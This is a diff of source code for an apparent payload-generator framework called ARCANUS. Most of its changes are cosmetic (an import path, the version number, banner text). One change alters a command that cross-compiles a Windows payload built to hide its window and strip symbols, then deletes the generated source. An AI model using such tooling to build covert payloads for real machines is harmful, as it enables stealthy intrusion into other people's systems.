@@ -11,7 +11,7 @@ import "runtime"
 import "io"
 import "io/ioutil"
 import "encoding/base64"
-import "color"
+import "github.com/fatih/color"
 import "os/exec"
 import "path/filepath"
 
@@ -23,7 +23,7 @@ var Payload PAYLOAD
 var Conn_Point *net.Conn
 
 const BUFFER_SIZE int = 1024
-const VERSION string = "1.5.4"
+const VERSION string = "1.5.6"
 
 
 type PAYLOAD struct {
@@ -380,7 +380,7 @@ func BANNER() {
     color.Red("          | | | || |\\ \\ | \\__/\\| | | || |\\  | |_| /\\__/ /")
     color.Red("          \\_| |_/\\_| \\_| \\____/\\_| |_/\\_| \\_/\\___/\\____/ ")
     color.Green("\n\n+ -- --=[      ARCANUS FRAMEWORK                  ]")
-    color.Green("+ -- --=[ Version: "+VERSION+"                         ]")
+    color.Green("+ -- --=[ Version: "+VERSION+"                          ]")
     color.Green("+ -- --=[ Support: arcanusframework@gmail.com     ]")
     color.Green("+ -- --=[          Created By Ege Balcı           ]")
   }else if runtime.GOOS == "linux" {
@@ -394,9 +394,9 @@ func BANNER() {
     color.Red("          |/     \\||/   \\__/(_______/|/     \\||/    )_)(_______)\\_______)")
 
     color.Green("\n\n+ -- --=[      ARCANUS FRAMEWORK                  ]")
-    color.Green("+ -- --=[ Version: "+VERSION+"                         ]")
+    color.Green("+ -- --=[ Version: "+VERSION+"                          ]")
     color.Green("+ -- --=[ Support: arcanusframework@gmail.com     ]")
-    color.Green("+ -- --=[          Created By Ege Balcı           ]")
+    color.Green("+ -- --=[               Ege Balcı                 ]")
 
   }
 }
@@ -445,7 +445,7 @@ func GENERATE_WINDOWS_PAYLOAD() {
     exec.Command("cmd", "/C", "del Payload.go").Run()
     runtime.GC()
   }else if runtime.GOOS == "linux" {
-    exec.Command("sh", "-c", "export GOOS=windows && export GOARCH=386 && go build -ldflags \"-H windowsgui -s\" Payload.go && export GOOS=linux && export GOARCH=amd64").Run()
+    exec.Command("sh", "-c", "export GOOS=windows && export GOARCH=386 && go build -ldflags \"-H windowsgui -s\" Payload.go").Run()
     runtime.GC()
     exec.Command("sh", "-c", "rm Payload.go").Run()
   }
